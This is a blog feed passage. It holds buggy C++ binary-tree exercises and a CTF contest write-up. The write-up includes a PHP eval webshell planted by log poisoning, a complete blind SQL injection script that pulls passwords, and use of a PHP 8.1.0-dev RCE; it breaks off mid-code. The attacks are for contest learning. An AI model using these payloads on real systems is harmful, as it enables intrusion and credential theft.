class="hljs-keyword">struct</span> <span class="hljs-title">BThrNode</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>;</span><br>    <span class="hljs-type">int</span> ltag, rtag;<br>&#125;BThrNode, *BThrTree;<br><br>BThrTree T,p;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createBTree</span><span class="hljs-params">(BThrTree &amp;T)</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;ch;<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;@&#x27;</span>) T=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        T=new BThrNode;<br>        T-&gt;data=ch;<br>        createBTree(T-&gt;lchild);<br>        createBTree(T-&gt;rchild);<br>    &#125;<br>&#125;<br>BThrTree pre=<span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">InThread</span><span class="hljs-params">(BThrTree p)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(p!=<span class="hljs-literal">NULL</span>)<br>    &#123;<br>        InThread(p-&gt;lchild);<br>        <span class="hljs-keyword">if</span>(p-&gt;lchild==<span class="hljs-literal">NULL</span>)&#123;p-&gt;ltag=<span class="hljs-number">1</span>; p-&gt;lchild=pre;&#125;<br>        <span class="hljs-keyword">else</span> p-&gt;ltag=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(p-&gt;rchild==<span class="hljs-literal">NULL</span>)&#123;p-&gt;rtag=<span class="hljs-number">1</span>; pre-&gt;rchild=p;&#125;<br>        <span class="hljs-keyword">else</span> pre-&gt;rtag=<span class="hljs-number">0</span>;<br>        pre=p;<br>        InThread(p-&gt;rchild);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">TraveBTree</span><span class="hljs-params">(BThrTree &amp;T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T)<br>    &#123;<br>        TraveBTree(T-&gt;lchild);<br>        <span class="hljs-built_in">cout</span>&lt;&lt;T-&gt;data;<br>        TraveBTree(T-&gt;rchild);<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    createBTree(T);<br>    InThread(p);<br>    TraveBTree(T);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="7079（中序遍历）"><a href="#7079（中序遍历）" class="headerlink" title="7079（中序遍历）"></a>7079（中序遍历）</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span>&#123;</span><br>    <span class="hljs-type">char</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>;</span><br>    <span class="hljs-comment">//int ltag, rtag;</span><br>&#125;BTNode, *BTree;<br><br>BTree T;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createBTree</span><span class="hljs-params">(BTree &amp;T)</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;ch;<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;@&#x27;</span>) T=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        T=new BTNode;<br>        T-&gt;data=ch;<br>        createBTree(T-&gt;lchild);<br>        createBTree(T-&gt;rchild);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//void InThread(BThrTree p)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//    if(p!=NULL)</span><br><span class="hljs-comment">//    &#123;</span><br><span class="hljs-comment">//        InThread(p-&gt;lchild);</span><br><span class="hljs-comment">//        if(p-&gt;lchild==NULL)&#123;p-&gt;ltag=1; p-&gt;lchild=pre;&#125;</span><br><span class="hljs-comment">//        else p-&gt;ltag=0;</span><br><span class="hljs-comment">//        if(p-&gt;rchild==NULL)&#123;p-&gt;rtag=1; pre-&gt;rchild=p;&#125;</span><br><span class="hljs-comment">//        else pre-&gt;rtag=0;</span><br><span class="hljs-comment">//        pre=p;</span><br><span class="hljs-comment">//        InThread(p-&gt;rchild);</span><br><span class="hljs-comment">//    &#125;</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">TraveBTree</span><span class="hljs-params">(BTree &amp;T)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(T)<br>    &#123;<br>        TraveBTree(T-&gt;lchild);<br>        <span class="hljs-built_in">cout</span>&lt;&lt;T-&gt;data;<br>        TraveBTree(T-&gt;rchild);<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    createBTree(T);<br>    TraveBTree(T);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="7077（层次遍历）"><a href="#7077（层次遍历）" class="headerlink" title="7077（层次遍历）"></a>7077（层次遍历）</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_SIZE=<span class="hljs-number">1010</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span>&#123;</span><br>    <span class="hljs-type">char</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>;</span><br>    <span class="hljs-comment">//int ltag, rtag;</span><br>&#125;BTNode, *BTree;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    BTNode data[MAX_SIZE];<br>    <span class="hljs-type">int</span> front,rear;<br>&#125;SQ;<br>BTree T;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createBTree</span><span class="hljs-params">(BTree &amp;T)</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;ch;<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;@&#x27;</span>) T=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        T=new BTNode;<br>        T-&gt;data=ch;<br>        createBTree(T-&gt;lchild);<br>        createBTree(T-&gt;rchild);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//void InThread(BThrTree p)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//    if(p!=NULL)</span><br><span class="hljs-comment">//    &#123;</span><br><span class="hljs-comment">//        InThread(p-&gt;lchild);</span><br><span class="hljs-comment">//        if(p-&gt;lchild==NULL)&#123;p-&gt;ltag=1; p-&gt;lchild=pre;&#125;</span><br><span class="hljs-comment">//        else p-&gt;ltag=0;</span><br><span class="hljs-comment">//        if(p-&gt;rchild==NULL)&#123;p-&gt;rtag=1; pre-&gt;rchild=p;&#125;</span><br><span class="hljs-comment">//        else pre-&gt;rtag=0;</span><br><span class="hljs-comment">//        pre=p;</span><br><span class="hljs-comment">//        InThread(p-&gt;rchild);</span><br><span class="hljs-comment">//    &#125;</span><br><span class="hljs-comment">//&#125;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">TraveBTree</span><span class="hljs-params">(BTree &amp;T)</span><br>&#123;<br>    BTree p;<br>    <span class="hljs-built_in">queue</span>&lt;BTree&gt; Q;<br>    <span class="hljs-keyword">if</span>(T)<br>    &#123;<br>        Q.push(T);<br>        <span class="hljs-keyword">while</span> (!Q.empty())<br>        &#123;<br>            p=Q.front();<br>            <span class="hljs-built_in">cout</span>&lt;&lt;p-&gt;data;<br>            Q.pop();<br>            <span class="hljs-keyword">if</span>(p-&gt;lchild)   Q.push(p-&gt;lchild);<br>            <span class="hljs-keyword">if</span>(p-&gt;rchild)   Q.push(p-&gt;rchild);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    createBTree(T);<br>    TraveBTree(T);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="7080（父亲孩子表示法）"><a href="#7080（父亲孩子表示法）" class="headerlink" title="7080（父亲孩子表示法）"></a>7080（父亲孩子表示法）</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span>&#123;</span><br>    <span class="hljs-type">char</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">BTNode</span> *<span class="hljs-title">lchild</span>, *<span class="hljs-title">rchild</span>;</span><br>&#125;BTNode, *BTree;<br><br>BTree T;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createBTree</span><span class="hljs-params">(BTree &amp;T)</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-built_in">cin</span>&gt;&gt;ch;<br>    <span class="hljs-keyword">if</span>(ch==<span class="hljs-string">&#x27;@&#x27;</span>) T=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        T=new BTNode;<br>        T-&gt;data=ch;<br>        createBTree(T-&gt;lchild);<br>        createBTree(T-&gt;rchild);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Trave</span><span class="hljs-params">(BTree T)</span><br>&#123;<br>    <span class="hljs-comment">//int num=0;</span><br>    <span class="hljs-keyword">if</span>(!T)  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>(T-&gt;lchild==<span class="hljs-literal">NULL</span> &amp;&amp; T-&gt;rchild==<span class="hljs-literal">NULL</span>)  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> Trave(T-&gt;lchild)+ Trave(T-&gt;rchild);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Depth</span><span class="hljs-params">(BTree &amp;T)</span><br>&#123;<br>    <span class="hljs-type">int</span> m,n;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>  <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        m= Depth(T-&gt;lchild);<br>        n= Depth(T-&gt;rchild);<br>        <span class="hljs-keyword">if</span>(m&gt;n) <span class="hljs-keyword">return</span> m+<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span>    <span class="hljs-keyword">return</span> n+<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">CountLeaf</span><span class="hljs-params">(BTree &amp;T)</span><br>&#123;<br>    <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(T==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(T-&gt;lchild==<span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> CountLeaf(T-&gt;rchild)+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> CountLeaf(T-&gt;lchild)+ CountLeaf(T-&gt;rchild);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    createBTree(T);<br>    <span class="hljs-comment">//int ans= Depth(T);</span><br>    <span class="hljs-built_in">cout</span>&lt;&lt;CountLeaf(T)&lt;&lt;<span class="hljs-built_in">endl</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 树 </tag>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NEFU-NSILAB2021选拔赛WriteUp</title>
      <link href="/2021/11/fdc156ff.html"/>
      <url>/2021/11/fdc156ff.html</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>打开看到源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有任何过滤的文件包含，尝试&#x2F;根据提示进行日志包含，首先在访问时带上 <code>User-Agent: &lt;?php eval($_POST[1]); ?&gt;</code> 在日志里面写一句话。<br><img src="http://image.0error.net/202202101144500.png"><br>然后包含日志文件 <code>/var/log/nginx/access.log</code>，传一个 <code>phpinfo();</code> 可以看到成功 getshell。<br><img src="http://image.0error.net/202202101144060.png"><br>蚁剑连接或手动 <code>system(&#39;ls /&#39;);</code>，可以看到根目录下有一个 <code>flag.sh</code> 内容为：  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>sed -i &quot;s/root/$FLAG/&quot; /etc/passwd<br><br>export FLAG=not_flag<br>FLAG=not_flag<br></code></pre></td></tr></table></figure><p>可知 <code>flag</code> 被写进了 <code>/etc/passwd</code>，打开找到 <code>flag</code>。<br><img src="http://image.0error.net/202202101145976.png"></p><h3 id="babysqli"><a href="#babysqli" class="headerlink" title="babysqli"></a>babysqli</h3><p>打开看到一个登录页面，随意输入一个用户名密码，跳转到 <code>doLogin.php</code> 并提示 <code>Wrong password!</code>。根据题目名字可知是 sql 注入，在 <code>username</code> 参数后面加一个 <code>&#39;</code> 后出现了报错。<br><img src="http://image.0error.net/202202101145845.png"><br>直接盲猜一个报错注入<br><img src="http://image.0error.net/202202101145909.png"><br>咦？怎么什么都没出来？原来是 <code>updatexml extractvalue floor</code> 都被禁用了，同理可以尝试出被禁用的还有 <code>= and &amp;&amp;</code>，于是就有很多解法，这里因为没有回显于是进行了一个布尔盲注，写个脚本：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://ctf.nefu.edu.cn:29097/doLogin.php&quot;</span><br>true_flag = <span class="hljs-string">&quot;Congratutions!&quot;</span><br><span class="hljs-comment"># ctftraining,information_schema,mysql,performance_schema,test,web_sqli</span><br><span class="hljs-comment"># payload = &quot;select group_concat(schema_name) from information_schema.schemata&quot;</span><br><span class="hljs-comment"># user</span><br><span class="hljs-comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema like database()&quot;</span><br><span class="hljs-comment"># id,username,passwd</span><br><span class="hljs-comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_schema like database()&quot;</span><br>payload = <span class="hljs-string">&quot;select group_concat(passwd) from web.user&quot;</span><br><br>template = <span class="hljs-string">&quot;-1&#x27; union select 1,2,if(ascii(substr((&#123;&#125;), &#123;&#125;, 1))&gt;&#123;&#125;, 1, 0) #&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">valid_payload</span>(<span class="hljs-params">offset: <span class="hljs-built_in">int</span>, index: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    response = requests.post(url, data=&#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: template.<span class="hljs-built_in">format</span>(payload, offset, index),<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-number">1</span><br>    &#125;)<br>    <span class="hljs-keyword">return</span> true_flag <span class="hljs-keyword">in</span> response.text<br><br><br>index = <span class="hljs-number">1</span><br>result = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    start = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span>(<span class="hljs-built_in">abs</span>(start - end) == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> start == end):<br>        everage = (start + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> valid_payload(index, everage):<br>            start = everage<br>        <span class="hljs-keyword">else</span>:<br>            end = everage<br>    <span class="hljs-keyword">if</span> end &lt; start:<br>        end = start<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(end) == <span class="hljs-string">&quot;!&quot;</span>:<br>        <span class="hljs-keyword">break</span><br>    result += <span class="hljs-built_in">chr</span>(end)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] result: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>    index += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>脚本注出库名、表名、列名，最后注出 <code>admin</code> 的密码就是 <code>flag</code>，这里注意用 <code>like</code> 代替了被禁用的 <code>=</code>。<br><img src="http://image.0error.net/202202101146430.png"></p><h3 id="ezcve"><a href="#ezcve" class="headerlink" title="ezcve"></a>ezcve</h3><p>打开一看就输出个字符串 <code>Hello Nefuer!</code>，别的啥都没有。观察 <code>Response Headers</code> 可发现 <code>X-Powered-By: PHP/8.1.0-dev</code>，再根据题目名字搜索可知 <code>PHP 8.1.0-dev</code> 有一个 <a href="https://cloud.tencent.com/developer/article/1839234">RCE漏洞</a>，根据文章提示利用漏洞执行任意命令。<br><img src="http://image.0error.net/202202101146228.png"><br>题目提示 flag 在环境变量里，执行 <code>env</code> 命令获取所有环境变量，得到 flag。<br><img src="http://image.0error.net/202202101146569.png"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="signin-1"><a href="#signin-1" class="headerlink" title="signin"></a>signin</h3><p>下载文件是一个文本，里面明显是 base 编码，放进 <a href="https://gchq.github.io/CyberChef">CyberChef</a> 里面，进行 <code>base64+base32+base58</code> 解码得到 <code>flag</code>。<br><img src="http://image.0error.net/202202101147065.png"></p><h3 id="ezpng"><a href="#ezpng" class="headerlink" title="ezpng"></a>ezpng</h3><p>下载文件得到一个 png 文件，通过 <code>010editor</code> 或其他方式可知该图片的 CRC 值不对，高度被改过。<br><img src="http://image.0error.net/202202101147771.png"><br>手动更改高度的值或者通过脚本等方式爆破高度得到完整图片：<br><img src="http://image.0error.net/202202101147531.png"><br>图片中包含 flag：<br><img src="http://image.0error.net/202202101147274.png"></p><h3 id="traffic"><a href="#traffic" class="headerlink" title="traffic"></a>traffic</h3><p>下载文件解压压缩包，得到一个 <code>pcapng</code> 文件，<code>wireshark</code> 打开进行流量分析，导出其中的所有 <code>http</code> 对象<br><img src="http://image.0error.net/202202101148248.png"></p><p>其中有两个文件 <code>secret</code> 和 <code>test</code> 看起来不对劲，根据请求中的信息可知他们是 <code>brotli</code> 编码的，写个脚本或者通过其他方式解码：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> brotli<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">file: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> r:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;file[<span class="hljs-number">0</span>]&#125;</span>out&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> w:<br>            w.write(brotli.decompress(r.read()))<br><br><br><span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;secret&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>]:<br>    decode(name)<br></code></pre></td></tr></table></figure><p>得到 <code>sout</code> 和 <code>tout</code> 文件，查看文件内容或根据题目提示可知 <code>tout</code> 文件为 <code>protobuf</code> 协议的 <code>.proto</code> 文件，<code>sout</code> 可能为编码后的 <code>protobuf</code> 数据，这里使用 <code>protoc</code> 将 <code>sout</code> 作为 <code>PBResponse</code> 解码得到：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">protoc --decode PBResponse tout &lt; sout</span> <br>code: 200<br>flag_part_convert_to_hex_plz: 15100450<br>dataList &#123;<br>  flag_part: &quot;e2345&quot;<br>  junk_data: &quot;7af2c&quot;<br>&#125;<br>dataList &#123;<br>  flag_part: &quot;7889b0&quot;<br>  junk_data: &quot;82bc0&quot;<br>&#125;<br>flag_part_plz_convert_to_hex: 16453958<br>flag_last_part: &quot;d172a38dc&quot;<br></code></pre></td></tr></table></figure><p>根据字段名提示，将 <code>flag_part_convert_to_hex_plz</code> 和 <code>flag_part_plz_convert_to_hex</code> 的值转为十六进制后和其他部分拼接，得到 flag：<code>e66a22e23457889b0fb1146d172a38dc</code>。  </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">openssl rsautl -decrypt -in flag.enc -inkey private.pem -out msg.txt<br></code></pre></td></tr></table></figure><p>即可得到flag</p><h3 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 